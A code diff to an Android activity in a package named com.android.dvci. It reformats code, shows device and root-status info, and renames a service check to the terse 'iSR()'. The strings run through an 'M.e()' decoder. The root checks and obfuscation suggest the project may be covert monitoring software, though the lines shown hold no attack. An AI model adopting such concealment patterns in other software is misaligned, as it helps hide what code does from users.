@@ -19,9 +19,9 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.widget.TextView;
 
-import com.android.dvci.R;
 import com.android.dvci.Core;
 import com.android.dvci.Device;
+import com.android.dvci.R;
 import com.android.dvci.Root;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
@@ -42,9 +42,8 @@ public class ASG extends Activity {
 
 	/**
 	 * Called when the activity is first created.
-	 * 
-	 * @param savedInstanceState
-	 *            the saved instance state
+	 *
+	 * @param savedInstanceState the saved instance state
 	 */
 	@Override
 	public void onCreate(final Bundle savedInstanceState) {
@@ -105,10 +104,12 @@ public class ASG extends Activity {
 			if (Build.DISPLAY.length() > 0)
 				t.append("Display: " + Build.DISPLAY + "\n");
 		}
-		
+
 		t.append("OS Level: " + Build.VERSION.SDK_INT + "\n");
 		t.append("OS Release: " + Build.VERSION.RELEASE + "\n");
-		t.append("OS Runtime: " + (Root.isArtInUse()?"ART":"Dalvik")+ "\n");
+
+		t.append("OS Runtime: " + (Root.isArtInUse() ? "ART" : "Dalvik") + "\n");
+
 		if (Cfg.DEBUG) {
 			if (PackageInfo.hasSu()) {
 				t.append("Su: yes, ");
@@ -130,7 +131,7 @@ public class ASG extends Activity {
 		final String service = pack + M.e(".app"); //$NON-NLS-1$
 
 		try {
-			if (Core.isServiceRunning() == false) {
+			if (Core.iSR() == false) {
 				final ComponentName cn = startService(new Intent(service));
 			}
 		} catch (final SecurityException se) {
@@ -144,7 +145,7 @@ public class ASG extends Activity {
 		// final String service = "android.intent.action.MAIN";
 
 		try {
-			if (Core.isServiceRunning() == false) {
+			if (Core.iSR() == false) {
 				this.handler = new Handler();
 
 				if (Cfg.DEBUG) {
